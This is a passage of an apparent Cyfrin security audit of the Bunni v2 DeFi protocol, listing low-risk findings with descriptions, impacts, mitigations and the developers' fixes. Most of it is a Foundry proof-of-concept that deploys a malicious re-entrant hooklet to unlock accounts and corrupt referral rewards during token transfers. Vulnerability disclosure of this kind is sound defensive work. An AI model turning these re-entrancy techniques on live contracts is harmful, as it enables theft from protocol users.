        floodPlain.fulfillOrder(signedOrder, address(this), abi.encode(false, poolKey1.toId(), address(bt1)));
        vm.roll(vm.getBlockNumber() + 7200);
        bunniHook.getBidWrite(poolKey1.toId(), true);
        vm.roll(vm.getBlockNumber() + 7200);
        // reverts as there is insufficient token balance
        vm.expectRevert();
        bunniHook.getBidWrite(poolKey1.toId(), true);
    }
}
```

**Recommended Mitigation:** Consider overriding all virtual functions to include the re-entrancy guard that is locked when `rebalanceOrderHook()` is called.

**Bacon Labs:** Fixed in commit [75de098](https://github.com/timeless-fi/bunni-v2/pull/118/commits/75de098e79b268f65fbd4d9be72cb9041640a43e).

**Cyfrin:** Verified. The `AmAmm` functions have been overridden to be non-reentrant and disabled during active fulfilment of a rebalance order.

\clearpage
## Low Risk


### Token transfer hooks should be invoked at the end of execution to prevent the hooklet executing over intermediate state

**Description:** `ERC20Referrer::transfer` invokes the `_afterTokenTransfer()` hook before the unlocker callback (assuming the recipient is locked):

```solidity
function transfer(address to, uint256 amount) public virtual override returns (bool) {
    ...

    _afterTokenTransfer(msgSender, to, amount);

    // Unlocker callback if `to` is locked.
    if (toLocked) {
        IERC20Unlocker unlocker = unlockerOf(to);
        unlocker.lockedUserReceiveCallback(to, amount);
    }

    return true;
}
```

However, this should be performed after the callback since `BunniToken` overrides the hook to call the hooklet which can execute over intermediate state before execution of the unlocker callback:

```solidity
function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
    // call hooklet
    IHooklet hooklet_ = hooklet();
    if (hooklet_.hasPermission(HookletLib.AFTER_TRANSFER_FLAG)) {
        hooklet_.hookletAfterTransfer(msg.sender, poolKey(), this, from, to, amount);
    }
}
```

Additionally, while the `BunniHub` implements a re-entrancy guard, this does not prevent cross-contract re-entrancy between the `BunniHub` and `BunniToken` contracts via hooklet calls. A valid exploit affecting legitimate pools has not been identified, but this is not a guarantee that such a vulnerability does not exist. As a matter of best practice, cross-contract re-entrancy should be forbidden.

**Impact:** * A locked receiver could invoke the unlocker within the hooklet call to unlock their account. The callback would continue to be executed, potentially abusing the locking functionality to accrue rewards to an account that is no longer locked.
* The referral score of the protocol can be erroneously credited to a different referrer.
* Deposits to the `BunniHub` can be made by re-entering `BunniToken` transfers via hooklet calls in the token transfer hooks, potentially corrupting referral reward accounting.

**Proof of Concept:** The following modifications to `BunniToken.t.sol` demonstrate all re-entrancy vectors:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.4;

import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";

import {LibString} from "solady/utils/LibString.sol";

import "./BaseTest.sol";
import "./mocks/ERC20UnlockerMock.sol";

import {console2} from "forge-std/console2.sol";

contract User {
    IPermit2 internal constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    address referrer;
    address unlocker;
    address token0;
    address token1;
    address weth;

    constructor(address _token0, address _token1, address _weth) {
        token0 = _token0;
        token1 = _token1;
        weth = _weth;
    }

    receive() external payable {}

    function updateReferrer(address _referrer) external {
        referrer = _referrer;
    }

    function doDeposit(
        IBunniHub hub,
        IBunniHub.DepositParams memory params
    ) external payable {
        params.referrer = referrer;
        IERC20(Currency.unwrap(params.poolKey.currency1)).approve(address(PERMIT2), type(uint256).max);
        PERMIT2.approve(address(Currency.unwrap(params.poolKey.currency1)), address(hub), type(uint160).max, type(uint48).max);

        PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
        PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
        PERMIT2.approve(address(weth), address(hub), type(uint160).max, type(uint48).max);

        console2.log("doing re-entrant deposit");
        (uint256 shares,,) = hub.deposit{value: msg.value}(params);
    }

    function updateUnlocker(address _unlocker) external {
        console2.log("updating unlocker: %s", _unlocker);
        unlocker = _unlocker;
    }

    function doUnlock() external {
        if(ERC20UnlockerMock(unlocker).token().isLocked(address(this))) {
            console2.log("doing unlock");
            ERC20UnlockerMock(unlocker).unlock(address(this));
        }
    }
}

contract ReentrantHooklet is IHooklet {
    IPermit2 internal constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    BunniTokenTest test;
    User user;
    IBunniHub hub;
    bool entered;

    constructor(BunniTokenTest _test, IBunniHub _hub, User _user) {
        test = _test;
        hub = _hub;
        user = _user;
    }

    receive() external payable {}

    function beforeTransfer(address sender, PoolKey memory key, IBunniToken bunniToken, address from, address to, uint256 amount) external returns (bytes4) {
        if (!entered && address(user) == to && IERC20(address(bunniToken)).balanceOf(address(user)) == 0) {
            entered = true;
            console2.log("making re-entrant deposit");

            uint256 depositAmount0 = 1 ether;
            uint256 depositAmount1 = 1 ether;
            uint256 value;
            if (key.currency0.isAddressZero()) {
                value = depositAmount0;
            } else if (key.currency1.isAddressZero()) {
                value = depositAmount1;
            }

            // deposit tokens
            IBunniHub.DepositParams memory depositParams = IBunniHub.DepositParams({
                poolKey: key,
                amount0Desired: depositAmount0,
                amount1Desired: depositAmount1,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp,
                recipient: address(user),
                refundRecipient: address(user),
                vaultFee0: 0,
                vaultFee1: 0,
                referrer: address(0)
            });

            user.doDeposit{value: value}(hub, depositParams);
        }

        return this.beforeTransfer.selector;
    }

    function afterTransfer(address sender, PoolKey memory key, IBunniToken bunniToken, address from, address to, uint256 amount) external returns (bytes4) {
        user.doUnlock();
        return this.afterTransfer.selector;
    }

    function beforeInitialize(address sender, IBunniHub.DeployBunniTokenParams calldata params)
        external
        returns (bytes4 selector) {
            return this.beforeInitialize.selector;
        }

    function afterInitialize(
        address sender,
        IBunniHub.DeployBunniTokenParams calldata params,
        InitializeReturnData calldata returnData
    ) external returns (bytes4 selector) {
        return this.afterInitialize.selector;
    }

    function beforeDeposit(address sender, IBunniHub.DepositParams calldata params)
        external
        returns (bytes4 selector) {
            return this.beforeDeposit.selector;
        }

    function beforeDepositView(address sender, IBunniHub.DepositParams calldata params)
        external
        view
        returns (bytes4 selector) {
            return this.beforeDeposit.selector;
        }

    function afterDeposit(
        address sender,
        IBunniHub.DepositParams calldata params,
        DepositReturnData calldata returnData
    ) external returns (bytes4 selector) {
        return this.afterDeposit.selector;
    }

    function afterDepositView(
        address sender,
        IBunniHub.DepositParams calldata params,
        DepositReturnData calldata returnData
    ) external view returns (bytes4 selector) {
        return this.afterDeposit.selector;
    }

    function beforeWithdraw(address sender, IBunniHub.WithdrawParams calldata params)
        external
        returns (bytes4 selector) {
            return this.beforeWithdraw.selector;
        }

    function beforeWithdrawView(address sender, IBunniHub.WithdrawParams calldata params)
        external
        view
        returns (bytes4 selector) {
            return this.beforeWithdraw.selector;
        }

    function afterWithdraw(
        address sender,
        IBunniHub.WithdrawParams calldata params,
        WithdrawReturnData calldata returnData
    ) external returns (bytes4 selector) {
        return this.afterWithdraw.selector;
    }

    function afterWithdrawView(
        address sender,
        IBunniHub.WithdrawParams calldata params,
        WithdrawReturnData calldata returnData
    ) external view returns (bytes4 selector) {
        return this.afterWithdraw.selector;
    }

    function beforeSwap(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params)
        external
        returns (bytes4 selector, bool feeOverriden, uint24 fee, bool priceOverridden, uint160 sqrtPriceX96) {
            return (this.beforeSwap.selector, false, 0, false, 0);
        }

    function beforeSwapView(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params)
        external
        view
        returns (bytes4 selector, bool feeOverriden, uint24 fee, bool priceOverridden, uint160 sqrtPriceX96) {
            return (this.beforeSwap.selector, false, 0, false, 0);
        }

    function afterSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        SwapReturnData calldata returnData
    ) external returns (bytes4 selector) {
        return this.afterSwap.selector;
    }

    function afterSwapView(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        SwapReturnData calldata returnData
    ) external view returns (bytes4 selector) {
        return this.afterSwap.selector;
    }
}

contract BunniTokenTest is BaseTest, IUnlockCallback {
    using LibString for *;
    using CurrencyLibrary for Currency;

    uint256 internal constant MAX_REL_ERROR = 1e4;

    IBunniToken internal bunniToken;
    ERC20UnlockerMock internal unlocker;
    // address bob = makeAddr("bob");
    address payable bob;
    address alice = makeAddr("alice");
    address refA = makeAddr("refA");
    address refB = makeAddr("refB");
    Currency internal currency0;
    Currency internal currency1;
    PoolKey internal key;

    function setUp() public override {
        super.setUp();

        currency0 = CurrencyLibrary.ADDRESS_ZERO;
        currency1 = Currency.wrap(address(token1));

        // deploy BunniToken
        bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-30), int16(6), ALPHA));
        bytes memory hookParams = abi.encodePacked(
            FEE_MIN,
            FEE_MAX,
            FEE_QUADRATIC_MULTIPLIER,
            FEE_TWAP_SECONDS_AGO,
            POOL_MAX_AMAMM_FEE,
            SURGE_HALFLIFE,
            SURGE_AUTOSTART_TIME,
            VAULT_SURGE_THRESHOLD_0,
            VAULT_SURGE_THRESHOLD_1,
            REBALANCE_THRESHOLD,
            REBALANCE_MAX_SLIPPAGE,
            REBALANCE_TWAP_SECONDS_AGO,
            REBALANCE_ORDER_TTL,
            true, // amAmmEnabled
            ORACLE_MIN_INTERVAL,
            MIN_RENT_MULTIPLIER
        );

        // deploy ReentrantHooklet with all flags
        bytes32 salt;
        unchecked {
            bytes memory creationCode = abi.encodePacked(
                type(ReentrantHooklet).creationCode,
                abi.encode(
                    this,
                    hub,
                    User(bob)
                )
            );
            uint256 offset;
            while (true) {
                salt = bytes32(offset);
                address deployed = computeAddress(address(this), salt, creationCode);
                if (
                    uint160(bytes20(deployed)) & HookletLib.ALL_FLAGS_MASK == HookletLib.ALL_FLAGS_MASK
                        && deployed.code.length == 0
                ) {
                    break;
                }
                offset++;
            }
        }

        bob = payable(address(new User(address(token0), address(token1), address(weth))));
        vm.label(address(bob), "bob");
        vm.label(address(token0), "token0");
        vm.label(address(token1), "token1");
        ReentrantHooklet hooklet = new ReentrantHooklet{salt: salt}(this, hub, User(bob));

        if (currency0.isAddressZero()) {
            vm.deal(address(hooklet), 100 ether);
            vm.deal(address(bob), 100 ether);
        } else if (Currency.unwrap(currency0) == address(weth)) {
            vm.deal(address(this), 200 ether);
            weth.deposit{value: 200 ether}();
            weth.transfer(address(hooklet), 100 ether);
            weth.transfer(address(bob), 100 ether);
        } else {
            deal(Currency.unwrap(currency0), address(hooklet), 100 ether);
            deal(Currency.unwrap(currency0), address(bob), 100 ether);
        }

        if (Currency.unwrap(currency1) == address(weth)) {
            vm.deal(address(this), 200 ether);
            weth.deposit{value: 200 ether}();
            weth.transfer(address(hooklet), 100 ether);
            weth.transfer(address(bob), 100 ether);
        } else {
            deal(Currency.unwrap(currency1), address(hooklet), 100 ether);
            deal(Currency.unwrap(currency1), address(bob), 100 ether);
        }

        (bunniToken, key) = hub.deployBunniToken(
            IBunniHub.DeployBunniTokenParams({
                currency0: currency0,
                currency1: currency1,
                tickSpacing: 10,
                twapSecondsAgo: 7 days,
                liquidityDensityFunction: ldf,
                hooklet: IHooklet(address(hooklet)),
                ldfType: LDFType.DYNAMIC_AND_STATEFUL,
                ldfParams: ldfParams,
                hooks: bunniHook,
                hookParams: hookParams,
                vault0: ERC4626(address(0)),
                vault1: ERC4626(address(0)),
                minRawTokenRatio0: 0.08e6,
                targetRawTokenRatio0: 0.1e6,
                maxRawTokenRatio0: 0.12e6,
                minRawTokenRatio1: 0.08e6,
                targetRawTokenRatio1: 0.1e6,
                maxRawTokenRatio1: 0.12e6,
                sqrtPriceX96: uint160(Q96),
                name: "BunniToken",
                symbol: "BUNNI",
                owner: address(this),
                metadataURI: "",
                salt: bytes32(0)
            })
        );

        poolManager.setOperator(address(bunniToken), true);

        unlocker = new ERC20UnlockerMock(IERC20Lockable(address(bunniToken)));
        vm.label(address(unlocker), "unlocker");
        User(bob).updateUnlocker(address(unlocker));
    }

    function test_PoCUnlockerReentrantHooklet() external {
        uint256 amountAlice = _makeDeposit(key, 1 ether, 1 ether, alice, refA);
        uint256 amountBob = _makeDeposit(key, 1 ether, 1 ether, bob, refB);

        // lock account as `bob`
        vm.prank(bob);
        bunniToken.lock(unlocker, "");
        assertTrue(bunniToken.isLocked(bob), "isLocked returned false");
        assertEq(address(bunniToken.unlockerOf(bob)), address(unlocker), "unlocker incorrect");
        assertEq(unlocker.lockedBalances(bob), amountBob, "locked balance incorrect");

        // transfer from `alice` to `bob`
        vm.prank(alice);
        bunniToken.transfer(bob, amountAlice);

        assertEq(bunniToken.balanceOf(alice), 0, "alice balance not 0");
        assertEq(bunniToken.balanceOf(bob), amountAlice + amountBob, "bob balance not equal to sum of amounts");
        console2.log("locked balance of bob: %s", unlocker.lockedBalances(bob));
        console2.log("but bunniToken.isLocked(bob) actually now returns: %s", bunniToken.isLocked(bob));
    }

    function test_PoCMinInitialSharesScore() external {
        uint256 amount = _makeDeposit(key, 1 ether, 1 ether, alice, address(0));
        assertEq(bunniToken.scoreOf(address(0)), amount + MIN_INITIAL_SHARES, "initial score not 0");

        // transfer from `alice` to `bob` (re-entrant deposit)
        vm.prank(alice);
        bunniToken.transfer(bob, amount);

        console2.log("score of address(0): %s != %s", bunniToken.scoreOf(address(0)), MIN_INITIAL_SHARES);
        console2.log("score of refB: %s", bunniToken.scoreOf(refB));
    }

    function test_PoCCrossContractReentrantHooklet() external {
        // 1. Make initial deposit from alice with referrer refA
        address referrer = refA;
        assertEq(bunniToken.scoreOf(referrer), 0, "initial score not 0");
        console2.log("making initial deposit");
        uint256 amount = _makeDeposit(key, 1 ether, 1 ether, alice, referrer);
        assertEq(bunniToken.referrerOf(alice), referrer, "referrer incorrect");
        assertEq(bunniToken.balanceOf(alice), amount, "balance not equal to amount");
        assertEq(bunniToken.scoreOf(referrer), amount, "score not equal to amount");

        // 2. Distribute rewards
        poolManager.unlock(abi.encode(currency0, 1 ether));
        bunniToken.distributeReferralRewards(true, 1 ether);
        (uint256 claimable, ) = bunniToken.getClaimableReferralRewards(address(0));
        console2.log("claimable of address(0): %s", claimable);
        (claimable, ) = bunniToken.getClaimableReferralRewards(refA);
        console2.log("claimable of refA: %s", claimable);

        // 3. Transfer bunni token to bob (re-entrant)
        referrer = address(0);
        assertEq(bunniToken.referrerOf(bob), referrer, "bob initial referrer incorrect");
        assertEq(bunniToken.scoreOf(referrer), 1e12, "initial score of referrer not MIN_INITIAL_SHARES");
        referrer = refB;
        assertEq(bunniToken.scoreOf(referrer), 0, "initial score referrer not 0");

        console2.log("transferring (re-entrant deposit)");
        // update state in User contract to use refB in deposit
        referrer = refB;
        User(bob).updateReferrer(referrer);
        vm.prank(alice);
        bunniToken.transfer(bob, amount);

        // 4. After the transfer finishes
        assertEq(bunniToken.referrerOf(bob), referrer, "referrer incorrect");
        assertGt(bunniToken.balanceOf(bob), amount, "balance not greater than amount");

        uint256 totalSupply = bunniToken.totalSupply();
        uint256 totalScore = bunniToken.scoreOf(address(0)) + bunniToken.scoreOf(refA) + bunniToken.scoreOf(refB);
        console2.log("totalSupply: %s", totalSupply);
        console2.log("totalScore: %s", totalScore);

        address[] memory referrerAddresses = new address[](3);
        referrerAddresses[0] = address(0);
        referrerAddresses[1] = refA;
        referrerAddresses[2] = refB;
        uint256[] memory referrerScores = new uint256[](3);
        uint256[] memory claimableAmounts = new uint256[](3);
        for (uint256 i; i < referrerAddresses.length; i++) {
            referrerScores[i] = bunniToken.scoreOf(referrerAddresses[i]);
            console2.log("score of %s: %s", referrerAddresses[i], referrerScores[i]);
            (uint256 claimable0, ) =
                bunniToken.getClaimableReferralRewards(referrerAddresses[i]);
            claimableAmounts[i] = claimable0;
            console2.log("claimable amount of %s: %s", referrerAddresses[i], claimable0);
        }
    }
}
```

**Recommended Mitigation:** * Re-order the unlocker callback logic to ensure the `_afterTokenTransfer()` hook is invoked at the very end of execution. This also applies to `transferFrom()`, both overloaded implementations of `_mint()`, and `_transfer()`.
* Apply a global guard to prevent cross-contract re-entrancy.

**Bacon Labs:** Fixed in [PR \#102](https://github.com/timeless-fi/bunni-v2/pull/102).

**Cyfrin:** Verified, the after token transfer hook is now invoked after the unlocker callback.


### Potentially dirty upper bits of narrow types could affect allowance computations in `ERC20Referrer`

**Description:** Solidity makes no guarantees about the contents of the upper bits of variables whose types do not span the full 32-byte width. Consider `ERC20Referrer::_transfer`, for example:

```solidity
function _transfer(address from, address to, uint256 amount) internal virtual override {
    bool toLocked;

    _beforeTokenTransfer(from, to, amount, address(0));
    /// @solidity memory-safe-assembly
    assembly {
        let from_ := shl(96, from)
        // Compute the balance slot and load its value.
        mstore(0x0c, _BALANCE_SLOT_SEED)
        mstore(0x00, from)
        let fromBalanceSlot := keccak256(0x0c, 0x20)
        let fromBalance := sload(fromBalanceSlot)
        ...
    }
    ...
}
```

Here, and similarly in `transferFrom()`, the `from_` variable defined within the assembly block shifts left the upper 96 bits to effectively clean the potentially dirty upper bits; however, this variable is actually unused. In this case, there is no issue, since the keccak hash does not consider the upper bits.

Other assembly usage throughout the contract fails to shift addresses to clean the upper bits, for example in `approve()` and `transferFrom()` where the allowance slot could be incorrectly computed if the upper bits of the `spender` address are dirty:

```solidity
function approve(address spender, uint256 amount) public virtual override returns (bool) {
    address msgSender = LibMulticaller.senderOrSigner();
    /// @solidity memory-safe-assembly
    assembly {
        // Compute the allowance slot and store the amount.
        mstore(0x20, spender)
        mstore(0x0c, _ALLOWANCE_SLOT_SEED)
        mstore(0x00, msgSender)
        sstore(keccak256(0x0c, 0x34), amount)
        // Emit the {Approval} event.
        mstore(0x00, amount)
        log3(0x00, 0x20, _APPROVAL_EVENT_SIGNATURE, msgSender, shr(96, mload(0x2c)))
    }
    return true;
}
```

**Impact:** Token allowances could be incorrectly computed, most likely resulting in a DoS of functionality but with a small chance that allowance could be set for an unintended spender.

**Recommended Mitigation:** * Remove the unused `from_` variables if they are not needed.
* Clean the upper bits of all narrow type variables used in the assembly blocks in such a way that could be considered unsafe (e.g. in `approve()` and `transferFrom()`.

**Bacon Labs:** Fixed in [PR \#104](https://github.com/timeless-fi/bunni-v2/pull/104).

**Cyfrin:** Verified, the upper bits of narrow type in `ERC20Referrer` are now cleaned.


### `LibBuyTheDipGeometricDistribution::cumulativeAmount0` will always return 0 due to insufficient `alphaX96` validation

**Description:** While the combination of `LibBuyTheDipGeometricDistribution::isValidParams` and `LibBuyTheDipGeometricDistribution::geometricIsValidParams` should be functionally equivalent to `LibGeometricDistribution::isValidParams`, except for the shift mode enforcement, this is not the case.

```solidity
    function geometricIsValidParams(int24 tickSpacing, bytes32 ldfParams) internal pure returns (bool) {
        (int24 minUsableTick, int24 maxUsableTick) =
            (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));

        // | shiftMode - 1 byte | minTickOrOffset - 3 bytes | length - 2 bytes | alpha - 4 bytes |
        uint8 shiftMode = uint8(bytes1(ldfParams));
        int24 minTickOrOffset = int24(uint24(bytes3(ldfParams << 8)));
        int24 length = int24(int16(uint16(bytes2(ldfParams << 32))));
        uint256 alpha = uint32(bytes4(ldfParams << 48));

        // ensure minTickOrOffset is aligned to tickSpacing
        if (minTickOrOffset % tickSpacing != 0) {
            return false;
        }

        // ensure length > 0 and doesn't overflow when multiplied by tickSpacing
        // ensure length can be contained between minUsableTick and maxUsableTick
        if (
            length <= 0 || int256(length) * int256(tickSpacing) > type(int24).max
                || length > maxUsableTick / tickSpacing || -length < minUsableTick / tickSpacing
        ) return false;

        // ensure alpha is in range
@>      if (alpha < MIN_ALPHA || alpha > MAX_ALPHA || alpha == ALPHA_BASE) return false;

        // ensure the ticks are within the valid range
        if (shiftMode == uint8(ShiftMode.STATIC)) {
            // static minTick set in params
            int24 maxTick = minTickOrOffset + length * tickSpacing;
            if (minTickOrOffset < minUsableTick || maxTick > maxUsableTick) return false;
        }

        // if all conditions are met, return true
        return true;
    }
```

The missing `alphaX96` validation can result in the potential issue described in the `LibGeometricDistribution` comment:

```solidity
    function isValidParams(int24 tickSpacing, uint24 twapSecondsAgo, bytes32 ldfParams) internal pure returns (bool) {
        ...
        // ensure alpha is in range
        if (alpha < MIN_ALPHA || alpha > MAX_ALPHA || alpha == ALPHA_BASE) return false;

@>      // ensure alpha != sqrtRatioTickSpacing which would cause cum0 to always be 0
        uint256 alphaX96 = alpha.mulDiv(Q96, ALPHA_BASE);
        uint160 sqrtRatioTickSpacing = tickSpacing.getSqrtPriceAtTick();
        if (alphaX96 == sqrtRatioTickSpacing) return false;
```

Additionally, `LibBuyTheDipGeometricDistribution::geometricIsValidParams` does not validate the minimum liquidity densities, unlike `LibGeometricDistribution::isValidParams`.

**Impact:** The current implementation of `LibBuyTheDipGeometricDistribution::geometricIsValidParams` does not prevent configuration with an `alpha` that can cause unexpected behavior, resulting in swaps and deposits reverting.

**Recommended Mitigation:** Ensure that `alpha` is in range:
```diff
        if (alpha < MIN_ALPHA || alpha > MAX_ALPHA || alpha == ALPHA_BASE) return false;
++      // ensure alpha != sqrtRatioTickSpacing which would cause cum0 to always be 0
++      uint256 alphaX96 = alpha.mulDiv(Q96, ALPHA_BASE);
++      uint160 sqrtRatioTickSpacing = tickSpacing.getSqrtPriceAtTick();
++      if (alphaX96 == sqrtRatioTickSpacing) return false;
```

Additionally ensure the liquidity density is nowhere equal to zero, but rather at least `MIN_LIQUIDITY_DENSITY`.

**Bacon Labs:** Fixed in [PR \#103](https://github.com/timeless-fi/bunni-v2/pull/103). The minimum liquidity check is intentionally omitted to allow the alternative LDF to be at a lower price where the default LDF may have less than the minimum required liquidity.

**Cyfrin:** Verified, the alpha validation has been added to `LibBuyTheDipGeometricDistribution::geometricIsValidParams`.


### Queued withdrawals should use an external protocol-owned unlocker to prevent `BunniHub` earning referral rewards

**Description:** When the am-AMM is enabled with an active manager, withdrawals must be queued:

```solidity
    function withdraw(HubStorage storage s, Env calldata env, IBunniHub.WithdrawParams calldata params)
        external
        returns (uint256 amount0, uint256 amount1)
    {
        /// -----------------------------------------------------------------------
        /// Validation
        /// -----------------------------------------------------------------------

        if (!params.useQueuedWithdrawal && params.shares == 0) revert BunniHub__ZeroInput();

        PoolId poolId = params.poolKey.toId();
        PoolState memory state = getPoolState(s, poolId);
        IBunniHook hook = IBunniHook(address(params.poolKey.hooks));

        IAmAmm.Bid memory topBid = hook.getTopBidWrite(poolId);
@>      if (hook.getAmAmmEnabled(poolId) && topBid.manager != address(0) && !params.useQueuedWithdrawal) {
            revert BunniHub__NeedToUseQueuedWithdrawal();
    }
```

The caller's Bunni tokens are transferred to the `BunniHub`, where they are escrowed until the `WITHDRAW_DELAY` has passed:

```solidity
    function queueWithdraw(HubStorage storage s, IBunniHub.QueueWithdrawParams calldata params) external {
        /// -----------------------------------------------------------------------
        /// Validation
        /// -----------------------------------------------------------------------

        PoolId id = params.poolKey.toId();
        IBunniToken bunniToken = _getBunniTokenOfPool(s, id);
        if (address(bunniToken) == address(0)) revert BunniHub__BunniTokenNotInitialized();

        /// -----------------------------------------------------------------------
        /// State updates
        /// -----------------------------------------------------------------------

        address msgSender = LibMulticaller.senderOrSigner();
        QueuedWithdrawal memory queued = s.queuedWithdrawals[id][msgSender];

        // update queued withdrawal
        // use unchecked to get unlockTimestamp to overflow back to 0 if overflow occurs
        // which is fine since we only care about relative time
        uint56 newUnlockTimestamp;
        unchecked {
            newUnlockTimestamp = uint56(block.timestamp) + WITHDRAW_DELAY;
        }
        if (queued.shareAmount != 0) {
            // requeue expired queued withdrawal
            if (queued.unlockTimestamp + WITHDRAW_GRACE_PERIOD >= block.timestamp) {
                revert BunniHub__NoExpiredWithdrawal();
            }
            s.queuedWithdrawals[id][msgSender].unlockTimestamp = newUnlockTimestamp;
        } else {
            // create new queued withdrawal
            if (params.shares == 0) revert BunniHub__ZeroInput();
            s.queuedWithdrawals[id][msgSender] =
                QueuedWithdrawal({shareAmount: params.shares, unlockTimestamp: newUnlockTimestamp});
        }

        /// -----------------------------------------------------------------------
        /// External calls
        /// -----------------------------------------------------------------------

        if (queued.shareAmount == 0) {
            // transfer shares from msgSender to address(this)
@>          bunniToken.transferFrom(msgSender, address(this), params.shares);
        }

        emit IBunniHub.QueueWithdraw(msgSender, id, params.shares);
    }
```

However, this overlooks the fact that `BunniToken` inherits `ERC20Referrer` and invokes transfer hooks that update referrer scores. Given that the `BunniHub` does not specify a referrer of its own, this results in referral rewards being earned for the protocol when they should instead continue to be applied to the caller's actual referrer.

**Impact:** Queued withdrawals can result in referrers losing out on distributed rewards.

**Recommended Mitigation:** Rather than transferring Bunni tokens queued for withdrawal to the `BunniHub`, consider implementing a separate `IERC20Unlocker` contract which locks the queued tokens on queued withdrawal and unlocks them again after the delay has passed. This would also help to prevent potential collision with nested Bunni token reserves held by the `BunniHub`.

**Bacon Labs:** Acknowledged. Were OK with the existing implementation since withdrawals are only queued for very short amounts of time so the referral rewards going to the protocol would be minimal.

**Cyfrin:** Acknowledged, assuming queued withdrawals are indeed processed within the expected time frame.


### Potential erroneous surging when vault token decimals differ from the underlying asset

**Description:** When the vault share prices are computed in `BunniHookLogic::_shouldSurgeFromVaults`, the logic assumes that the vault share token decimals will be equal to the decimals of the underlying asset:

```solidity
// compute current share prices
uint120 sharePrice0 =
    bunniState.reserve0 == 0 ? 0 : reserveBalance0.divWadUp(bunniState.reserve0).toUint120();
uint120 sharePrice1 =
    bunniState.reserve1 == 0 ? 0 : reserveBalance1.divWadUp(bunniState.reserve1).toUint120();
// compare with share prices at last swap to see if we need to apply the surge fee
// surge fee is applied if the share price has increased by more than 1 / vaultSurgeThreshold
shouldSurge = prevSharePrices.initialized
    && (
        dist(sharePrice0, prevSharePrices.sharePrice0)
            > prevSharePrices.sharePrice0 / hookParams.vaultSurgeThreshold0
            || dist(sharePrice1, prevSharePrices.sharePrice1)
                > prevSharePrices.sharePrice1 / hookParams.vaultSurgeThreshold1
    );
```

Here, `reserveBalance0/1` is in the decimals of the underlying asset, whereas `bunniState.reserve0/1` is in the decimals of the vault share token. As a result, the computed `sharePrice0/1` could be significantly more/less than the expected 18 decimals.

While the ERC-4626 specification strongly recommends that the vault share token decimals mirror those of the underlying asset, this is not always the case. For example, this [Morpho vault](https://etherscan.io/address/0xd508f85f1511aaec63434e26aeb6d10be0188dc7) has an 18-decimal share token whereas the underlying WBTC has 8 decimals. Such a vault strictly conforming to the standard would break the assumption that share prices are always in `WAD` precision, but rather 8 corresponding to the underlying, and could result in a surge being considered necessary even if this shouldn't have been the case.

Considering a `vaultSurgeThreshold` of `1e3` as specified in the tests, the logic will trigger a surge when the absolute share price difference is greater than 0.1%. In the above case where share price is in 8 decimals, assuming that the share price is greater than 1 would mean that the threshold could be specified as at most `0.000001%`. This is not a problem when the maximum possible threshold of `type(uint16).max` is specified, since this corresponds to approximately `0.0015%`, but if the vault has negative yield then this can make the share price drop below 1 and the possible precision even further with it, amplified further still for larger differences between vault/asset decimals that result in even lower-precision share prices. In the worst case, while quite unlikely, this division rounds down to zero and a surge is executed when it is not actually needed, since any absolute change in share price will be greater than zero. The threshold is immutable, so it would not be trivial to avoid such a situation.

Additionally, this edge case results in the possibility for vault share prices to overflow `uint120` when the share token decimals are smaller than those of the underlying asset. For example, a 6-decimal share token for an 18-decimal underlying asset would overflow when a single share is worth more than `1_329_388` assets.

**Impact:** Surging when not needed may cause existing rebalance orders to be cleared when this is not actually desired, as well as computing a larger dynamic/surge fee than should be required which could prevent users from swapping. Overflowing share prices would result in DoS for swaps.

**Recommended Mitigation:** Explicitly handle the vault share token and underlying asset decimals to ensure that share prices are always in the expected 18-decimal precision.

**Bacon Labs:** Fixed in [PR \#100](https://github.com/timeless-fi/bunni-v2/pull/100).

**Cyfrin:** Verified, the token/vault values are now explicitly scaled during share price calculation in `_shouldSurgeFromVaults()`.


### Missing validation in `BunniQuoter` results in incorrect quotes

**Description:** `BunniQuoter::quoteDeposit` assumes that caller provided the correct vault fee; however, if a vault fee of zero is passed for a vault that has a non-zero vault fee, the returned quote will be incorrect as shown in the PoC below. Additionally, for the case where there is an existing share supply, this function is missing validation against existing token amounts. Specifically, when both token amounts are zero, the `BunniHub` reverts execution whereas the quoter will return success along with a share amount of `type(uint256).max`:
```solidity
    ...
    if (existingShareSupply == 0) {
        // ensure that the added amounts are not too small to mess with the shares math
        if (addedAmount0 < MIN_DEPOSIT_BALANCE_INCREASE && addedAmount1 < MIN_DEPOSIT_BALANCE_INCREASE) {
            revert BunniHub__DepositAmountTooSmall();
        }
        // no existing shares, just give WAD
        shares = WAD - MIN_INITIAL_SHARES;
        // prevent first staker from stealing funds of subsequent stakers
        // see https://code4rena.com/reports/2022-01-sherlock/#h-01-first-user-can-steal-everyone-elses-tokens
        shareToken.mint(address(0), MIN_INITIAL_SHARES, address(0));
    } else {
        // given that the position may become single-sided, we need to handle the case where one of the existingAmount values is zero
@>      if (existingAmount0 == 0 && existingAmount1 == 0) revert BunniHub__ZeroSharesMinted();
        shares = FixedPointMathLib.min(
            existingAmount0 == 0 ? type(uint256).max : existingShareSupply.mulDiv(addedAmount0, existingAmount0),
            existingAmount1 == 0 ? type(uint256).max : existingShareSupply.mulDiv(addedAmount1, existingAmount1)
        );
        if (shares == 0) revert BunniHub__ZeroSharesMinted();
    }
    ...
```

`BunniQuoter::quoteWithdraw` is missing the validation required for queued withdrawals if there exists an am-AMM manager which can be fetched through the `getTopBid()` function that uses an static call:
```diff
    function quoteWithdraw(address sender, IBunniHub.WithdrawParams calldata params)
        external
        view
        override
        returns (bool success, uint256 amount0, uint256 amount1)
    {
        PoolId poolId = params.poolKey.toId();
        PoolState memory state = hub.poolState(poolId);
        IBunniHook hook = IBunniHook(address(params.poolKey.hooks));

++      IAmAmm.Bid memory topBid = hook.getTopBid(poolId);
